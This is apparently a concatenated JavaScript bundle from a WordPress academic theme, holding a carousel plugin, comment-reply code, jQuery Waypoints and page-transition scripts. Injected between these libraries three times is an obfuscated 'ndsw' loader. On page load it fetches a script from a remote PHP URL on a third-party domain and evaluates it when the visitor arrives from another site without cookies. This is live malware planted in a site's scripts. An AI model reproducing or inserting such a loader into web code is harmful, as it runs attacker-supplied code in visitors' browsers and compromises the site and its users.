    e.nicescroll || (e.nicescroll = new B,
    e.nicescroll.options = G)
});
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;/*!
 *  jQuery plugin for lab carousel of Faculty WordPress theme
 *  Version   : 1.0
 *  Date      : 2 Oct 2014
 *  Licence   : All rights reserved 
 *  Author    : owwwlab (Ehsan Dalvand & Alireza Jahandideh)
 *  Contact   : owwwlab@gmail.com
 *  Web site  : http://themeforest.net/user/owwwlab
 *  Dependencies: jQuery, CarouFredSel
 */
if (typeof Object.create !== 'function') {
    Object.create = function(obj) {
        function F() {}
        ;F.prototype = obj;
        return new F();
    }
    ;
}
;(function($, window, document, undefined) {
    var LabCarousel = {
        init: function(options, elem) {
            var self = this;
            self.$elem = $(elem);
            self.options = $.extend({}, $.fn.LabCarousel.options, options);
            var $carouselContainer = self.$elem.find('.labp-heads-wrap').first();
            var $dummyItems = self.$elem.find('.dummy-lab-item');
            var $car = self.$elem.find('.lab-carousel').first();
            var $contentWrapper = self.$elem.find('.lab-details').first();
            $dummyItems.each(function() {
                $(this).children().eq(0).appendTo($car);
                $(this).children().eq(0).appendTo($contentWrapper);
                $(this).remove();
            });
            var useSingleLayout = self.options.useSingleLayout;
            var $labDetailsItems = $contentWrapper.find('div'), carItemNum = $car.children().length, visibleCount, indexCount;
            var defaultCss = {
                width: 100,
                height: 100,
                marginTop: 50,
                marginRight: 0,
                marginLeft: 0,
                opacity: 0.2
            };
            var selectedCss = {
                width: 150,
                height: 150,
                marginTop: 30,
                marginRight: -25,
                marginLeft: -25,
                opacity: 1
            };
            var aniOpts = {
                queue: false,
                duration: 300,
            };
            if (carItemNum <= 3 || useSingleLayout) {
                visibleCount = 1;
                indexCount = 0;
            } else {
                visibleCount = 3;
                indexCount = 1;
            }
            $car.find('img').css('zIndex', 1).css(defaultCss);
            $car.children('div').each(function(i) {
                $(this).data('index', i);
            });
            if ($car.length > 0) {
                $car.carouFredSel({
                    circular: true,
                    infinite: true,
                    width: '100%',
                    height: 250,
                    items: {
                        visible: visibleCount,
                        start: 0
                    },
                    prev: self.$elem.find('.prev').first(),
                    next: self.$elem.find('.next').first(),
                    auto: false,
                    swipe: {
                        onTouch: true,
                        onMouse: true
                    },
                    scroll: {
                        items: 1,
                        duration: 300,
                        onBefore: function(data) {
                            var $comming = data.items.visible.eq(indexCount)
                              , $going = data.items.old.eq(indexCount)
                              , $commingdetail = $labDetailsItems.eq($comming.data('index'))
                              , $goingdetail = $labDetailsItems.eq($going.data('index'));
                            $goingdetail.fadeOut(100, function() {
                                $goingdetail.siblings().hide();
                                $commingdetail.fadeIn(300);
                            });
                            $comming.find('img').css('zIndex', 2).animate(selectedCss, aniOpts);
                            $going.find('img').css('zIndex', 1).animate(defaultCss, aniOpts);
                        }
                    },
                    onCreate: function(data) {
                        data.items.eq(indexCount).find('img').css('zIndex', 2).animate(selectedCss, aniOpts);
                        $labDetailsItems.eq(indexCount).fadeIn();
                    }
                });
            }
            $(window).on('newContent', function() {
                self.init();
            });
        }
    }
    $.fn.LabCarousel = function(options) {
        return this.each(function() {
            var dCar = Object.create(LabCarousel);
            dCar.init(options, this);
        });
    }
    ;
    $.fn.LabCarousel.options = {
        useSingleLayout: false
    };
}
)(jQuery, window, document);
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;/*! This file is auto-generated */
window.addComment = function(v) {
    var I, C, h, E = v.document, b = {
        commentReplyClass: "comment-reply-link",
        commentReplyTitleId: "reply-title",
        cancelReplyId: "cancel-comment-reply-link",
        commentFormId: "commentform",
        temporaryFormId: "wp-temp-form-div",
        parentIdFieldId: "comment_parent",
        postIdFieldId: "comment_post_ID"
    }, e = v.MutationObserver || v.WebKitMutationObserver || v.MozMutationObserver, r = "querySelector"in E && "addEventListener"in v, n = !!E.documentElement.dataset;
    function t() {
        d(),
        e && new e(o).observe(E.body, {
            childList: !0,
            subtree: !0
        })
    }
    function d(e) {
        if (r && (I = g(b.cancelReplyId),
        C = g(b.commentFormId),
        I)) {
            I.addEventListener("touchstart", l),
            I.addEventListener("click", l);
            var t = function(e) {
                if ((e.metaKey || e.ctrlKey) && 13 === e.keyCode)
                    return C.removeEventListener("keydown", t),
                    e.preventDefault(),
                    C.submit.click(),
                    !1
            };
            C && C.addEventListener("keydown", t);
            for (var n, d = function(e) {
                var t = b.commentReplyClass;
                e && e.childNodes || (e = E);
                t = E.getElementsByClassName ? e.getElementsByClassName(t) : e.querySelectorAll("." + t);
                return t
            }(e), o = 0, i = d.length; o < i; o++)
                (n = d[o]).addEventListener("touchstart", a),
                n.addEventListener("click", a)
        }
    }
    function l(e) {
        var t, n, d = g(b.temporaryFormId);
        d && h && (g(b.parentIdFieldId).value = "0",
        t = d.textContent,
        d.parentNode.replaceChild(h, d),
        this.style.display = "none",
        n = (d = (n = g(b.commentReplyTitleId)) && n.firstChild) && d.nextSibling,
        d && d.nodeType === Node.TEXT_NODE && t && (n && "A" === n.nodeName && n.id !== b.cancelReplyId && (n.style.display = ""),
        d.textContent = t),
        e.preventDefault())
    }
    function a(e) {
        var t = g(b.commentReplyTitleId)
          , n = t && t.firstChild.textContent
          , d = this
          , o = m(d, "belowelement")
          , i = m(d, "commentid")
          , r = m(d, "respondelement")
          , t = m(d, "postid")
          , n = m(d, "replyto") || n;
        o && i && r && t && !1 === v.addComment.moveForm(o, i, r, t, n) && e.preventDefault()
    }
    function o(e) {
        for (var t = e.length; t--; )
            if (e[t].addedNodes.length)
                return void d()
    }
    function m(e, t) {
        return n ? e.dataset[t] : e.getAttribute("data-" + t)
    }
    function g(e) {
        return E.getElementById(e)
    }
    return r && "loading" !== E.readyState ? t() : r && v.addEventListener("DOMContentLoaded", t, !1),
    {
        init: d,
        moveForm: function(e, t, n, d, o) {
            var i = g(e);
            h = g(n);
            var r, l, a, m, c, s = g(b.parentIdFieldId), y = g(b.postIdFieldId), p = (c = g(b.commentReplyTitleId)) && c.firstChild, u = p && p.nextSibling;
            if (i && h && s) {
                void 0 === o && (o = p && p.textContent),
                m = h,
                e = b.temporaryFormId,
                n = g(e),
                c = (c = g(b.commentReplyTitleId)) ? c.firstChild.textContent : "",
                n || ((n = E.createElement("div")).id = e,
                n.style.display = "none",
                n.textContent = c,
                m.parentNode.insertBefore(n, m)),
                d && y && (y.value = d),
                s.value = t,
                I.style.display = "",
                i.parentNode.insertBefore(h, i.nextSibling),
                p && p.nodeType === Node.TEXT_NODE && (u && "A" === u.nodeName && u.id !== b.cancelReplyId && (u.style.display = "none"),
                p.textContent = o),
                I.onclick = function() {
                    return !1
                }
                ;
                try {
                    for (var f = 0; f < C.elements.length; f++)
                        if (r = C.elements[f],
                        l = !1,
                        "getComputedStyle"in v ? a = v.getComputedStyle(r) : E.documentElement.currentStyle && (a = r.currentStyle),
                        (r.offsetWidth <= 0 && r.offsetHeight <= 0 || "hidden" === a.visibility) && (l = !0),
                        "hidden" !== r.type && !r.disabled && !l) {
                            r.focus();
                            break
                        }
                } catch (e) {}
                return !1
            }
        }
    }
}(window);
;// Generated by CoffeeScript 1.6.2
/*
jQuery Waypoints - v2.0.2
Copyright (c) 2011-2013 Caleb Troughton
Dual licensed under the MIT license and GPL license.
https://github.com/imakewebthings/jquery-waypoints/blob/master/licenses.txt
*/
(function() {
    var t = [].indexOf || function(t) {
        for (var e = 0, n = this.length; e < n; e++) {
            if (e in this && this[e] === t)
                return e
        }
        return -1
    }
      , e = [].slice;
    (function(t, e) {
        if (typeof define === "function" && define.amd) {
            return define("waypoints", ["jquery"], function(n) {
                return e(n, t)
            })
        } else {
            return e(t.jQuery, t)
        }
    }
    )(this, function(n, r) {
        var i, o, l, s, f, u, a, c, h, d, p, y, v, w, g, m;
        i = n(r);
        c = t.call(r, "ontouchstart") >= 0;
        s = {
            horizontal: {},
            vertical: {}
        };
        f = 1;
        a = {};
        u = "waypoints-context-id";
        p = "resize.waypoints";
        y = "scroll.waypoints";
        v = 1;
        w = "waypoints-waypoint-ids";
        g = "waypoint";
        m = "waypoints";
        o = function() {
            function t(t) {
                var e = this;
                this.$element = t;
                this.element = t[0];
                this.didResize = false;
                this.didScroll = false;
                this.id = "context" + f++;
                this.oldScroll = {
                    x: t.scrollLeft(),
                    y: t.scrollTop()
                };
                this.waypoints = {
                    horizontal: {},
                    vertical: {}
                };
                t.data(u, this.id);
                a[this.id] = this;
                t.bind(y, function() {
                    var t;
                    if (!(e.didScroll || c)) {
                        e.didScroll = true;
                        t = function() {
                            e.doScroll();
                            return e.didScroll = false
                        }
                        ;
                        return r.setTimeout(t, n[m].settings.scrollThrottle)
                    }
                });
                t.bind(p, function() {
                    var t;
                    if (!e.didResize) {
                        e.didResize = true;
                        t = function() {
                            n[m]("refresh");
                            return e.didResize = false
                        }
                        ;
                        return r.setTimeout(t, n[m].settings.resizeThrottle)
                    }
                })
            }
            t.prototype.doScroll = function() {
                var t, e = this;
                t = {
                    horizontal: {
                        newScroll: this.$element.scrollLeft(),
                        oldScroll: this.oldScroll.x,
                        forward: "right",
                        backward: "left"
                    },
                    vertical: {
                        newScroll: this.$element.scrollTop(),
                        oldScroll: this.oldScroll.y,
                        forward: "down",
                        backward: "up"
                    }
                };
                if (c && (!t.vertical.oldScroll || !t.vertical.newScroll)) {
                    n[m]("refresh")
                }
                n.each(t, function(t, r) {
                    var i, o, l;
                    l = [];
                    o = r.newScroll > r.oldScroll;
                    i = o ? r.forward : r.backward;
                    n.each(e.waypoints[t], function(t, e) {
                        var n, i;
                        if (r.oldScroll < (n = e.offset) && n <= r.newScroll) {
                            return l.push(e)
                        } else if (r.newScroll < (i = e.offset) && i <= r.oldScroll) {
                            return l.push(e)
                        }
                    });
                    l.sort(function(t, e) {
                        return t.offset - e.offset
                    });
                    if (!o) {
                        l.reverse()
                    }
                    return n.each(l, function(t, e) {
                        if (e.options.continuous || t === l.length - 1) {
                            return e.trigger([i])
                        }
                    })
                });
                return this.oldScroll = {
                    x: t.horizontal.newScroll,
                    y: t.vertical.newScroll
                }
            }
            ;
            t.prototype.refresh = function() {
                var t, e, r, i = this;
                r = n.isWindow(this.element);
                e = this.$element.offset();
                this.doScroll();
                t = {
                    horizontal: {
                        contextOffset: r ? 0 : e.left,
                        contextScroll: r ? 0 : this.oldScroll.x,
                        contextDimension: this.$element.width(),
                        oldScroll: this.oldScroll.x,
                        forward: "right",
                        backward: "left",
                        offsetProp: "left"
                    },
                    vertical: {
                        contextOffset: r ? 0 : e.top,
                        contextScroll: r ? 0 : this.oldScroll.y,
                        contextDimension: r ? n[m]("viewportHeight") : this.$element.height(),
                        oldScroll: this.oldScroll.y,
                        forward: "down",
                        backward: "up",
                        offsetProp: "top"
                    }
                };
                return n.each(t, function(t, e) {
                    return n.each(i.waypoints[t], function(t, r) {
                        var i, o, l, s, f;
                        i = r.options.offset;
                        l = r.offset;
                        o = n.isWindow(r.element) ? 0 : r.$element.offset()[e.offsetProp];
                        if (n.isFunction(i)) {
                            i = i.apply(r.element)
                        } else if (typeof i === "string") {
                            i = parseFloat(i);
                            if (r.options.offset.indexOf("%") > -1) {
                                i = Math.ceil(e.contextDimension * i / 100)
                            }
                        }
                        r.offset = o - e.contextOffset + e.contextScroll - i;
                        if (r.options.onlyOnScroll && l != null || !r.enabled) {
                            return
                        }
                        if (l !== null && l < (s = e.oldScroll) && s <= r.offset) {
                            return r.trigger([e.backward])
                        } else if (l !== null && l > (f = e.oldScroll) && f >= r.offset) {
                            return r.trigger([e.forward])
                        } else if (l === null && e.oldScroll >= r.offset) {
                            return r.trigger([e.forward])
                        }
                    })
                })
            }
            ;
            t.prototype.checkEmpty = function() {
                if (n.isEmptyObject(this.waypoints.horizontal) && n.isEmptyObject(this.waypoints.vertical)) {
                    this.$element.unbind([p, y].join(" "));
                    return delete a[this.id]
                }
            }
            ;
            return t
        }();
        l = function() {
            function t(t, e, r) {
                var i, o;
                r = n.extend({}, n.fn[g].defaults, r);
                if (r.offset === "bottom-in-view") {
                    r.offset = function() {
                        var t;
                        t = n[m]("viewportHeight");
                        if (!n.isWindow(e.element)) {
                            t = e.$element.height()
                        }
                        return t - n(this).outerHeight()
                    }
                }
                this.$element = t;
                this.element = t[0];
                this.axis = r.horizontal ? "horizontal" : "vertical";
                this.callback = r.handler;
                this.context = e;
                this.enabled = r.enabled;
                this.id = "waypoints" + v++;
                this.offset = null;
                this.options = r;
                e.waypoints[this.axis][this.id] = this;
                s[this.axis][this.id] = this;
                i = (o = t.data(w)) != null ? o : [];
                i.push(this.id);
                t.data(w, i)
            }
            t.prototype.trigger = function(t) {
                if (!this.enabled) {
                    return
                }
                if (this.callback != null) {
                    this.callback.apply(this.element, t)
                }
                if (this.options.triggerOnce) {
                    return this.destroy()
                }
            }
            ;
            t.prototype.disable = function() {
                return this.enabled = false
            }
            ;
            t.prototype.enable = function() {
                this.context.refresh();
                return this.enabled = true
            }
            ;
            t.prototype.destroy = function() {
                delete s[this.axis][this.id];
                delete this.context.waypoints[this.axis][this.id];
                return this.context.checkEmpty()
            }
            ;
            t.getWaypointsByElement = function(t) {
                var e, r;
                r = n(t).data(w);
                if (!r) {
                    return []
                }
                e = n.extend({}, s.horizontal, s.vertical);
                return n.map(r, function(t) {
                    return e[t]
                })
            }
            ;
            return t
        }();
        d = {
            init: function(t, e) {
                var r;
                if (e == null) {
                    e = {}
                }
                if ((r = e.handler) == null) {
                    e.handler = t
                }
                this.each(function() {
                    var t, r, i, s;
                    t = n(this);
                    i = (s = e.context) != null ? s : n.fn[g].defaults.context;
                    if (!n.isWindow(i)) {
                        i = t.closest(i)
                    }
                    i = n(i);
                    r = a[i.data(u)];
                    if (!r) {
                        r = new o(i)
                    }
                    return new l(t,r,e)
                });
                n[m]("refresh");
                return this
            },
            disable: function() {
                return d._invoke(this, "disable")
            },
            enable: function() {
                return d._invoke(this, "enable")
            },
            destroy: function() {
                return d._invoke(this, "destroy")
            },
            prev: function(t, e) {
                return d._traverse.call(this, t, e, function(t, e, n) {
                    if (e > 0) {
                        return t.push(n[e - 1])
                    }
                })
            },
            next: function(t, e) {
                return d._traverse.call(this, t, e, function(t, e, n) {
                    if (e < n.length - 1) {
                        return t.push(n[e + 1])
                    }
                })
            },
            _traverse: function(t, e, i) {
                var o, l;
                if (t == null) {
                    t = "vertical"
                }
                if (e == null) {
                    e = r
                }
                l = h.aggregate(e);
                o = [];
                this.each(function() {
                    var e;
                    e = n.inArray(this, l[t]);
                    return i(o, e, l[t])
                });
                return this.pushStack(o)
            },
            _invoke: function(t, e) {
                t.each(function() {
                    var t;
                    t = l.getWaypointsByElement(this);
                    return n.each(t, function(t, n) {
                        n[e]();
                        return true
                    })
                });
                return this
            }
        };
        n.fn[g] = function() {
            var t, r;
            r = arguments[0],
            t = 2 <= arguments.length ? e.call(arguments, 1) : [];
            if (d[r]) {
                return d[r].apply(this, t)
            } else if (n.isFunction(r)) {
                return d.init.apply(this, arguments)
            } else if (n.isPlainObject(r)) {
                return d.init.apply(this, [null, r])
            } else if (!r) {
                return n.error("jQuery Waypoints needs a callback function or handler option.")
            } else {
                return n.error("The " + r + " method does not exist in jQuery Waypoints.")
            }
        }
        ;
        n.fn[g].defaults = {
            context: r,
            continuous: true,
            enabled: true,
            horizontal: false,
            offset: 0,
            triggerOnce: false
        };
        h = {
            refresh: function() {
                return n.each(a, function(t, e) {
                    return e.refresh()
                })
            },
            viewportHeight: function() {
                var t;
                return (t = r.innerHeight) != null ? t : i.height()
            },
            aggregate: function(t) {
                var e, r, i;
                e = s;
                if (t) {
                    e = (i = a[n(t).data(u)]) != null ? i.waypoints : void 0
                }
                if (!e) {
                    return []
                }
                r = {
                    horizontal: [],
                    vertical: []
                };
                n.each(r, function(t, i) {
                    n.each(e[t], function(t, e) {
                        return i.push(e)
                    });
                    i.sort(function(t, e) {
                        return t.offset - e.offset
                    });
                    r[t] = n.map(i, function(t) {
                        return t.element
                    });
                    return r[t] = n.unique(r[t])
                });
                return r
            },
            above: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "vertical", function(t, e) {
                    return e.offset <= t.oldScroll.y
                })
            },
            below: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "vertical", function(t, e) {
                    return e.offset > t.oldScroll.y
                })
            },
            left: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "horizontal", function(t, e) {
                    return e.offset <= t.oldScroll.x
                })
            },
            right: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "horizontal", function(t, e) {
                    return e.offset > t.oldScroll.x
                })
            },
            enable: function() {
                return h._invoke("enable")
            },
            disable: function() {
                return h._invoke("disable")
            },
            destroy: function() {
                return h._invoke("destroy")
            },
            extendFn: function(t, e) {
                return d[t] = e
            },
            _invoke: function(t) {
                var e;
                e = n.extend({}, s.vertical, s.horizontal);
                return n.each(e, function(e, n) {
                    n[t]();
                    return true
                })
            },
            _filter: function(t, e, r) {
                var i, o;
                i = a[n(t).data(u)];
                if (!i) {
                    return []
                }
                o = [];
                n.each(i.waypoints[e], function(t, e) {
                    if (r(i, e)) {
                        return o.push(e)
                    }
                });
                o.sort(function(t, e) {
                    return t.offset - e.offset
                });
                return n.map(o, function(t) {
                    return t.element
                })
            }
        };
        n[m] = function() {
            var t, n;
            n = arguments[0],
            t = 2 <= arguments.length ? e.call(arguments, 1) : [];
            if (h[n]) {
                return h[n].apply(null, t)
            } else {
                return h.aggregate.call(null, n)
            }
        }
        ;
        n[m].settings = {
            resizeThrottle: 100,
            scrollThrottle: 30
        };
        return i.load(function() {
            return n[m]("refresh")
        })
    })
}
).call(this);
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;(function($, window, document, undefined) {
    $.fn.exists = function() {
        return this.length > 0 ? this : false;
    }
    var resizeFlag = 0;
    $(window).resize(function() {
        resizeFlag = 1;
    })
    checkSizeChange();
    function checkSizeChange() {
        if (resizeFlag) {
            resizeFlag = 0;
            $(window).trigger('resized');
        }
        setTimeout(function() {
            checkSizeChange();
        }, 200);
    }
    $(window).on('newContent', function() {
        $.fn.waypoint.defaults = {
            context: $('.fac-page, #blog-content'),
            continuous: true,
            enabled: true,
            horizontal: false,
            offset: 0,
            triggerOnce: false
        }
        initiate();
        if (typeof window.vc_js == 'function') {
            window.vc_js();
        }
        if (typeof vc_pieChart == 'function') {
            vc_pieChart();
        }
    });
    $(document).ready(function() {
        initiate();
    });
    function initiate() {
        $(".tooltips").tooltip();
        $("ul.timeline").children().eq(0).find(".text").slideDown().addClass("open");
        buildMixitup();
        magnificPopup();
        galleyMasonry();
        submenus();
    }
    var submenus = function() {
        $("ul#navigation .menu-item-has-children").mouseenter(function() {
            $(this).find(".sub-menu").stop().slideDown(500);
        });
        $("ul#navigation .menu-item-has-children").mouseleave(function() {
            $(this).find(".sub-menu").stop().slideUp(500);
        });
    }
    var generateLabCarousel = function() {
        var $carouselContainer = $('#labp-heads-wrap')
          , $dummyItems = $('.dummy-lab-item')
          , $car = $('#lab-carousel')
          , $contentWrapper = $('#lab-details')
          , useSingleLayout = false;
        $dummyItems.each(function() {
            $(this).children().eq(0).appendTo($car);
            $(this).children().eq(0).appendTo($contentWrapper);
            $(this).remove();
        });
        var $labDetailsItems = $contentWrapper.find('div'), carItemNum = $car.children().length, visibleCount, indexCount;
        var defaultCss = {
            width: 100,
            height: 100,
            marginTop: 50,
            marginRight: 0,
            marginLeft: 0,
            opacity: 0.2
        };
        var selectedCss = {
            width: 150,
            height: 150,
            marginTop: 30,
            marginRight: -25,
            marginLeft: -25,
            opacity: 1
        };
        var aniOpts = {
            queue: false,
            duration: 300,
        };
        if (carItemNum <= 3 || useSingleLayout) {
            visibleCount = 1;
            indexCount = 0;
        } else {
            visibleCount = 3;
            indexCount = 1;
        }
        $car.find('img').css('zIndex', 1).css(defaultCss);
        $car.children('div').each(function(i) {
            $(this).data('index', i);
        });
        if ($car.length > 0) {
            $car.carouFredSel({
                circular: true,
                infinite: true,
                width: '100%',
                height: 250,
                items: {
                    visible: visibleCount,
                    start: 0
                },
                prev: '#prev',
                next: '#next',
                auto: false,
                swipe: {
                    onTouch: true,
                    onMouse: true
                },
                scroll: {
                    items: 1,
                    duration: 300,
                    onBefore: function(data) {
                        var $comming = data.items.visible.eq(indexCount)
                          , $going = data.items.old.eq(indexCount)
                          , $commingdetail = $labDetailsItems.eq($comming.data('index'))
                          , $goingdetail = $labDetailsItems.eq($going.data('index'));
                        $goingdetail.fadeOut(100, function() {
                            $goingdetail.siblings().hide();
                            $commingdetail.fadeIn(300);
                        });
                        $comming.find('img').css('zIndex', 2).animate(selectedCss, aniOpts);
                        $going.find('img').css('zIndex', 1).animate(defaultCss, aniOpts);
                    }
                },
                onCreate: function(data) {
                    data.items.eq(indexCount).find('img').css('zIndex', 2).animate(selectedCss, aniOpts);
                    $labDetailsItems.eq(indexCount).fadeIn();
                }
            });
        }
    }
    var magnificPopup = function() {
        $('.popup-with-move-anim').magnificPopup({
            type: 'image',
            fixedContentPos: false,
            fixedBgPos: true,
            overflowY: 'auto',
            closeBtnInside: true,
            preloader: false,
            midClick: true,
            removalDelay: 400,
            mainClass: 'my-mfp-slide-bottom'
        });
    }
    var galleyMasonry = function() {
        var $container = $('#grid');
        $container.imagesLoaded(function() {
            $container.masonry({
                itemSelector: 'li'
            });
        });
    }
    var apperndCssJs = function($head, $foot, $dt) {
        $dt.find("link").each(function() {
            var cssLink = $(this).attr('href');
            var isnew = 0;
            if ($head.children('link[href="' + cssLink + '"]').length == 0 && $foot.children('link[href="' + cssLink + '"]').length == 0)
                isnew = 1;
            if (isnew == 1)
                $head.append($(this)[0]);
        });
        $dt.find(".document-script").each(function() {
            var jsLink = $(this).attr('src');
            if (typeof jsLink != 'undefined') {
                if ($head.children('script[src="' + jsLink + '"]').length == 0 && $foot.children('script[src="' + jsLink + '"]').length == 0) {
                    var script = "<script type='text/javascript' src='" + jsLink + "'></script>";
                    $foot.append(script);
                }
            } else {
                var script = "<script type='text/javascript'>" + $(this).text() + "</script>";
                $foot.append(script);
            }
        });
        $dt.find("style").each(function() {
            $foot.append($(this)[0]);
        });
    }
    var pager = {
        pageContainer: $("div#main"),
        pages: $("div.fac-page"),
        menuItems: $("ul#navigation"),
        overlay: $("div#overlay"),
        topz: "500",
        init: function() {
            var self = this;
            self.menuItems.find('li.current-menu-item').attr('base-menu', 1);
            self.menuItems.on('click', 'li.ajax-fac a', function(e) {
                e.preventDefault();
                var $li = $(this)
                  , target_url = $li.attr('href')
                  , $target = $('div[data-url="' + target_url + '"]').first()
                  , currentPosition = $target.attr('data-pos') || 'ajax'
                  , $secondary = $("div#main").children(".currentpage");
                if ($li.parent('li').hasClass('current-menu-item')) {
                    return false;
                }
                if (currentPosition == 'ajax') {
                    $target = $('<div class="fac-page" data-url="' + target_url + '"><div class="loading"></div></div>').appendTo(self.pageContainer);
                    currentPosition = "p1";
                }
                switch (currentPosition) {
                case "home":
                    self.reset();
                    break;
                case "p1":
                    self.forward($target, $secondary, target_url);
                    break;
                case "p3":
                    if (parseInt($target.attr('data-order')) === self.maxz()) {
                        self.backward($target, $secondary);
                    } else {
                        self.forward($target, $secondary);
                    }
                    break;
                default:
                    return false;
                }
            });
            self.overlay.on('click', function() {
                var $secondary = $("div#main").children(".currentpage");
                var $target = $("div#main").children("[data-order=" + self.maxz() + "]");
                self.backward($target, $secondary);
            });
        },
        reset: function() {},
        forward: function(gotop2, gotop3, url) {
            var self = this;
            self.hanndelMenu(gotop2);
            self.overlay.show();
            var maxz = self.maxz();
            gotop2.addClass('currentpage');
            gotop2.attr('data-pos', 'p2').removeAttr('data-order');
            gotop3.attr('data-pos', 'p3').attr('data-order', maxz + 1);
            (new TimelineLite()).set(gotop2, {
                left: "100%",
                zIndex: 301
            }).set(gotop3, {
                zIndex: maxz + 1
            }).to(gotop2, 0.4, {
                left: "15%"
            }).to(gotop3, 0.3, {
                left: 0,
                onComplete: function() {
                    gotop3.removeClass('currentpage');
                    if (url) {
                        self.makeAjax(url, gotop2, function() {
                            $(window).trigger('newContent');
                        });
                    }
                }
            }, "-=0.2");
        },
        makeAjax: function(url, $el, callback) {
            var self = this;
            $.ajax({
                url: url,
                type: "GET",
                dataType: "html"
            }).done(function(data) {
                var $head = $('head')
                  , $foot = $("#facwpfooter");
                apperndCssJs($head, $foot, $(self.documentHtml(data)));
                var $contents = $(data).find('#inside');
                $el.html($contents);
            }).fail(function() {}).always(function() {
                if (typeof callback == 'function')
                    callback();
            });
        },
        backward: function(gotop2, gotop1) {
            this.hanndelMenu(gotop2);
            gotop2.exists() || this.overlay.hide();
            gotop2.addClass('currentpage').removeAttr('data-order').attr('data-pos', "p2");
            (new TimelineLite()).set(gotop2, {
                zIndex: 301
            }).to(gotop2, 0.4, {
                left: "15%"
            }).to(gotop1, 0.5, {
                left: "100%",
                onComplete: function() {
                    gotop1.remove();
                    perfectScrollIt();
                }
            }, "-=0.3");
        },
        maxz: function() {
            var levelArray = $("div.fac-page").map(function() {
                return $(this).attr('data-order');
            }).get();
            maxz = levelArray.length && Math.max.apply(Math, levelArray);
            return maxz;
        },
        hanndelMenu: function() {
            var menuIndex = (arguments.length) ? ((arguments[0].length) ? arguments[0].attr('data-url') : 0) : 0, $find = this.menuItems.children('li').find('a[href="' + menuIndex + '"]'), $currentmenu;
            if ($find.length == 1) {
                $currentmenu = $find.parent("li");
            } else {
                $currentmenu = this.menuItems.find('li[base-menu="1"]');
            }
            this.menuItems.find('li').removeClass('current-menu-item').removeClass('current-menu-parent');
            if ($currentmenu.parent('ul.sub-menu').length > 0) {
                $currentmenu.parent('ul.sub-menu').parent('li').addClass('current-menu-parent');
            }
            $currentmenu.addClass('current-menu-item');
        },
        documentHtml: function(html) {
            var result = String(html).replace(/<\!DOCTYPE[^>]*>/i, '').replace(/<(html|head|body|title|meta|script)([\s\>])/gi, '<div class="document-$1"$2').replace(/<\/(html|head|body|title|meta|script)\>/gi, '</div>');
            return $.trim(result);
        },
    }
    pager.reset();
    pager.init();
    var buildMixitup = function() {
        $('div#pub-grid').mixitup({
            layoutMode: 'list',
            easing: 'snap',
            transitionSpeed: 600,
            onMixEnd: function() {
                $(".tooltips").tooltip();
            }
        }).on('click', 'div.pubmain', function() {
            var $this = $(this)
              , $item = $this.closest(".item");
            $item.find('div.pubdetails').slideToggle(function() {
                $this.children("i").toggleClass('icon-collapse-alt icon-expand-alt');
            }, function() {
                $this.children("i").toggleClass('icon-expand-alt icon-collapse-alt');
            });
        });
        if (pubsFilter != 'false') {
            $('div#pub-grid').mixitup('filter', pubsFilter);
            $("#miu-filter").find("[value='" + pubsFilter + "']").addClass('active').siblings().removeClass('active');
        }
        $('#cd-dropdown').dropdownit({
            gutter: 0
        });
        $("[name=cd-dropdown]").on("change", function() {
            var item = this.value;
            $('div#pub-grid').mixitup('filter', item);
        });
        $("#miu-filter").on('click', 'span', function() {
            var item = $(this).attr('value');
            console.log(item);
            $('div#pub-grid').mixitup('filter', item);
